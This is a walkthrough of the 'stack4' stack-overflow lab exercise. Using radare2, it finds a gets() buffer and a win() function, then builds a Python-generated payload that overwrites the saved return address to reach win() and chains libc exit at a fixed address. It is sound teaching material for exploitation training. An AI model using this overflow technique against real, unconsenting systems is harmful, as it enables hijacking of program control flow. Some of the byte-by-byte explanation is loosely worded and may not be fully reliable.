This time we don't have anymore a variable to modify, if we load the binary in radare2 and see the main function:
    # r2 ./stack4
    > aaa
    > s main
    > pdf
    > avfn buffer s
We can see that there's only a call to a function gets, with a single buffer. That's all for function main, this buffer is in the offset 0x44 of the stack, and in radare2 we have to count also the ebp pushed in the prologue, so the buffer is a size of 0x40, and the other 4 bytes are the ebp value pushed on the stack.
This exercise is the first where we are going to control the EIP value, we have to see where to send the program, again we are gonna search for strings in the visual mode:
    > vvv
    > [ESC] # and here decide which box we want to see we select "Search strings in data sections"

We have the string "code flow succesfully changed" in the address 0x80484e0, we can search for references:
    > axt 0x080484e0
    sym.win 0x80483fa [DATA] mov dword [esp], str.code_flow_successfully_changed

Again we see that inside of function sym.win we see that our string is used, so probably we will have to use that function, we can see its address with:
    > afl
    0x080483f4  1   20  sym.win

And as there's no other option to modify the control flow, but there's no protection in the stack. So we will make a buffer overflow changing the EIP saved on the stack. We wilsl write 0x48 (because of alignment) bytes of trash, then 4 bytes to modify stored EBP, and finally 4 bytes that will change the stored EIP, where we will save 0x080483f4 in reverse: \xf4\x83\x04\x08.
We can try to search for some ROPs in order to fix the stack once we've executed our function, or in this case as the system doesn't implement ASLR we can execute the exit function from libc, that it is in the address 0xb7ec60c0.
So our payload will be:

    # python -c "print 'A'*0x48 + 'BBBB' + '\xf4\x83\x04\x08' + '\xc0\x60\xec\xb7' + 'BBBB' + '\x00\x00\x00\x00'" | ./stack4
    code flow successfully changed
    # echo $?
    0

* 'A'*0x48 = fill buffer + alignment
* 'BBBB' = stored EBP
* '\xf4\x83\x04\x08' = address of win
* '\xc0\x60\xec\xb7' = libc.exit
* 'BBBB' = return value for exit (we don't care about it)
* '\x00\x00\x00\x00' = it doesn't matter, it will be return value of exit 
